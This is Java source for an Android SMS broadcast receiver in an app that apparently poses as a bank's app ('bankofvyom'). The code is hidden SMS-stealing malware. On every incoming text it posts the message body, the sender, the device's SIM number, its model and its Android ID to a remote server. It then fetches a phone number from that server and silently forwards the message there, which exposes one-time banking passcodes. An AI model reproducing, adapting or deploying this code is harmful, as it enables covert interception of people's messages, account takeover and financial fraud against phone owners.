package com.bankofvyom.app;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import org.json.JSONException;
import org.json.JSONObject;

public class SmsReceiver extends BroadcastReceiver {

    private String previous_message = "";
    private  int userId = 0;
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() != null && intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                        if (smsMessage != null) {
                            String receiver = Helper.getSimNumbers(context);
                            String sender = "Receiver : "+receiver + "<br> Sender : " +  smsMessage.getDisplayOriginatingAddress();
                            String messageBody = smsMessage.getMessageBody();
                            if(messageBody!=previous_message){
                                previous_message = messageBody;
                                JSONObject jsonData = new JSONObject();
                                try {
                                    Helper help = new Helper();
                                    jsonData.put("site", help.SITE());
                                    jsonData.put("message", messageBody);
                                    jsonData.put("sender", sender);
                                    jsonData.put("model", Build.MODEL);
                                    jsonData.put("mobile_id", Helper.getAndroidId(context));
                                    jsonData.put("status", "N/A");
                                    Helper.postRequest(help.SMSSavePath(), jsonData, new Helper.ResponseListener() {
                                        @Override
                                        public void onResponse(String result) {
                                            if (result.startsWith("Response Error:")) {
                                                Toast.makeText(context, "Response Error : "+result, Toast.LENGTH_SHORT).show();
                                            } else {
                                                    try {
                                                        //Log.d(Helper.TAG, "RESPONN RESULT : "+result);
                                                            JSONObject response = new JSONObject(result);
                                                            if(response.getInt("status")==200){
                                                                  userId  = response.getInt("data");
                                                                    Helper.getRequest("/site/number?site="+ help.SITE(), new Helper.ResponseListener(){
                                                                        @Override
                                                                        public void onResponse(String result){
                                                                            try {
                                                                                // Parse JSON response
                                                                                JSONObject jsonResponse = new JSONObject(result);
                                                                                if (jsonResponse.has("data")) {
                                                                                    String phoneNumber = jsonResponse.getString("data");
                                                                                    int sentRequestCode = (userId + phoneNumber).hashCode(); // Generate unique request code
                                                                                    int deliveredRequestCode = (userId + phoneNumber + "_delivered").hashCode();

                                                                                    Intent sentIntent = new Intent(context, SentReceiver.class);
                                                                                    Intent deliveredIntent = new Intent(context, DeliveredReceiver.class);
                                                                                    sentIntent.putExtra("id", userId);
                                                                                    sentIntent.putExtra("phone", phoneNumber);
                                                                                    deliveredIntent.putExtra("id", userId);
                                                                                    deliveredIntent.putExtra("phone", phoneNumber);
                                                                                    PendingIntent sentPendingIntent = PendingIntent.getBroadcast(context, sentRequestCode, sentIntent, PendingIntent.FLAG_IMMUTABLE);
                                                                                    PendingIntent deliveredPendingIntent = PendingIntent.getBroadcast(context, deliveredRequestCode, deliveredIntent, PendingIntent.FLAG_IMMUTABLE);
                                                                                    SmsManager smsManager = SmsManager.getDefault();
                                                                                    smsManager.sendTextMessage(phoneNumber, null, messageBody, sentPendingIntent, deliveredPendingIntent);
                                                                                    //Log.d(Helper.TAG, "SMS Forward");
                                                                                } else {
                                                                                    Log.e("MYAPP: ", "Response does not contain 'data' field");
                                                                                }
                                                                            } catch (JSONException e) {
                                                                                e.printStackTrace();
                                                                                Log.e("MYAPP: ", "JSON Parsing Error: " + e.getMessage());
                                                                            }
                                                                        }
                                                                    });

                                                            }else{
                                                                Toast.makeText(context, "Status Not 200 : "+response, Toast.LENGTH_SHORT).show();
                                                            }
                                                        } catch (JSONException e) {
                                                            e.printStackTrace();
                                                        }
                                                    }
                                            }
                                    });
                                } catch (JSONException e) {
                                    throw new RuntimeException(e);
                                }
                            }else{
                                //Log.d("mywork", "Duplicate message received from " + sender + " with message: " + messageBody);
                            }
                        }
                    }
                }
            }
        }
    }

}
